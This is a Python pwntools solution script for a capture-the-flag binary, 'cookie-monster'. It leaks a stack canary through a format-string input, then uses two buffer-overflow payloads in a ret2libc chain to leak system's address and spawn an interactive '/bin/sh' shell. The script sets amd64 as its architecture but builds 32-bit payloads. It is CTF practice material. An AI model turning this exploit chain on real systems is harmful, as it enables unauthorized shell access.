#/usr/bin/python3

from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    con = remote ('chals.damctf.xyz', 31312)
else:
    con = process('./cookie-monster')

def leak_canary():
    con.recvuntil(b'Enter your name:')
    con.sendline(b'%15$p')
    con.recvuntil(b'Hello ')
    canary = con.recvline().strip()
    con.recvuntil(b'What would you like to purchase?')
    return int(canary, 16)

def main():
    main     = 0x08048669
    bakery   = 0x08048586
    puts_plt = 0x08048430
    system_got = 0x0804a020

    canary = leak_canary()

    payload  = b''
    payload += b'A' * 32
    payload += p32(canary)
    payload += b'B' * 12
    payload += p32(puts_plt)
    payload += p32(main)
    payload += p32(system_got)

    con.sendline(payload)

    con.recvuntil(b'Have a nice day!\n')
    system_libc = u32(con.recvline().strip()[:4].ljust(4, b'\x00'))

    print(system_libc)

    system_offset = 0x03ce10
    binsh_offset = 0x17b88f
    libc_base = system_libc - system_offset
    binsh_libc = libc_base + binsh_offset

    canary = leak_canary()

    payload  = b''
    payload += b'A' * 32
    payload += p32(canary)
    payload += b'B' * 12
    payload += p32(system_libc)
    payload += p32(main)
    payload += p32(binsh_libc)

    con.sendline(payload)

    con.interactive()

if __name__ == '__main__':
    main()
